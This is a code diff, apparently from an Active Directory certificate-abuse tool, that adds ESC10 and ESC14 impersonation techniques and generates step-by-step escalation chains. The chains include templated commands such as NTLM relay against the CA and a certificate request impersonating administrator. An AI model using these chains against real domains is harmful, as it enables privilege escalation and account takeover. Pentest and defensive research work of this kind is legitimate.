@@ -32,8 +32,10 @@ var ESCDescription = map[string]struct {
 	"ESC7":      {"Vulnerable CA ACLs", "ManageCA/ManageCertificates on CA server", "Medium"},
 	"ESC8":      {"NTLM Relay to AD CS HTTP Endpoints", "Relay NTLM auth to web enrollment for certificate issuance", "Medium"},
 	"ESC9":      {"CT_FLAG_NO_SECURITY_EXTENSION (No Security Extension)", "UPN spoofing via certificate without requester SID", "Medium"},
+	"ESC10":     {"Weak Certificate Mapping (CertificateMappingMethods)", "Impersonation via weak UPN or S4U2Self certificate mapping", "Medium"},
 	"ESC11":     {"NTLM Relay to AD CS RPC Interface", "Relay NTLM auth to ICertPassage RPC for certificate issuance", "Medium"},
 	"ESC13":     {"OID group link — issuance policy linked to security group via msDS-OIDToGroupLink", "Privilege escalation via OID-to-group membership mapping", "Low"},
+	"ESC14":     {"Weak Explicit Mappings via altSecurityIdentities", "Impersonation via schema v1 templates with weak binding enforcement", "Medium"},
 }
 
 // BuildAttackChain analyzes enumerated templates and generates prioritized attack paths.
@@ -144,6 +146,16 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Obtain certificate as the relayed principal",
 			fmt.Sprintf("Command: ntlmrelayx.py -t http://<CA_HOSTNAME>/certsrv/certfnsh.asp -smb2support --adcs --template %s", tmpl.Name),
 		}
+	case "ESC10":
+		return []string{
+			fmt.Sprintf("Identify template: %s (authentication EKU + weak certificate mapping)", tmpl.Name),
+			"Confirm CertificateMappingMethods includes UPN (0x04) or S4U2Self (0x08)",
+			"Confirm StrongCertificateBindingEnforcement < 2",
+			"Obtain a certificate with authentication EKU from the template",
+			"Authenticate using the certificate — DC maps via weak UPN/S4U2Self method",
+			fmt.Sprintf("Command: certstrike pki --exploit esc9 --template %s --upn administrator@%s --attacker-dn CN=%s,... --target-dc %s --domain %s",
+				tmpl.Name, cfg.Domain, cfg.Username, cfg.TargetDC, cfg.Domain),
+		}
 	case "ESC11":
 		return []string{
 			"Identify CA with IF_ENFORCEENCRYPTICERTREQUEST flag NOT set",
@@ -151,6 +163,14 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Relay coerced NTLM auth to the CA's RPC interface (ICertPassage/MS-ICPR)",
 			"Obtain certificate as the relayed principal",
 			fmt.Sprintf("Command: ntlmrelayx.py -t rpc://<CA_HOSTNAME> -rpc-mode ICPR -icpr-ca-name %q -smb2support", tmpl.Name),
+		}
+	case "ESC14":
+		return []string{
+			fmt.Sprintf("Identify template: %s (schema v%d + authentication EKU + weak binding)", tmpl.Name, tmpl.SchemaVersion),
+			"Confirm StrongCertificateBindingEnforcement < 2 and CertificateMappingMethods includes UPN (0x04)",
+			"Enroll for a certificate from the schema v1 template",
+			"Set altSecurityIdentities on target user to map the issued certificate",
+			"Authenticate using the certificate — DC accepts explicit mapping without strong binding",
 		}
 	default:
 		return []string{
